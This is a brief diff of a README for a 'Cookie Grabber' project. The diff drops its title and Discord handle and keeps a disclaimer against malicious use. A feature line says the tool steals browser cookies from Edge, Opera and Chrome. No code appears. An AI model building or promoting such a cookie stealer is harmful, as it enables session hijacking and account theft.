@@ -1,8 +1,4 @@
-# ꜱᴏᴍᴇᴛʜɪɴɢ's Cookie Grabber
-
-Discord: **something.py**
-
-**I, nor the original author, are responsible for malicious use of this code. We do not endorse it.**
+**I, nor the original author are responsible for malicious use of this code. We do not endorse it.**
 
 # Features
 	🟢Grabs Cookie from Edge, Opera (O or O-GX), Chrome, etc.
